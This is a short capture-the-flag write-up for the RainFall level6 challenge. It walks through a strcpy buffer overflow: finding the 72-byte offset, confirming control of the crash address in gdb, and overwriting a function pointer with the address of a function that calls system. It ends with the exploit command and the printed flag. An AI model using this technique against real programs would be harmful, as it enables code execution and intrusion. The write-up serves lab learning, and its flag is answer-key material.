We have the executable that do :

	param_2 is the pointer char** av
	__dest is a string of size 64
	ppcVar1 alloc size for 4 pointers
	ppcVar1[0] = m
	set the 1rd arguement in __dest (param_2 + 4 == av + 1, the offset of char ** and int are not the same)
	ppcVar1[0], so m is run
> check the source.c file

strcpy is vuln to overflow we use a [pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and we have an offset of 72

We check :

```sh
(gdb) run `python -c "print('\x90' * 72 + '\x11' * 4)"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level6/level6 `python -c "print('\x90' * 72 + '\x11' * 4)"`

Program received signal SIGSEGV, Segmentation fault.
0x11111111 in ?? ()
```
> OK

We're looking for the address to pass 

```sh
(gdb) disas n
Dump of assembler code for function n:
	0x08048454 <+0>:     push   %ebp
	0x08048455 <+1>:     mov    %esp,%ebp
	0x08048457 <+3>:     sub    $0x18,%esp
	0x0804845a <+6>:     movl   $0x80485b0,(%esp)
	0x08048461 <+13>:    call   0x8048370 <system@plt>
	0x08048466 <+18>:    leave
	0x08048467 <+19>:    ret
```

## Exploit
```sh
level6@RainFall:~$ ./level6 `python -c "print('\x90' * 72 + '\x54\x84\x04\x08')"`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
> EZ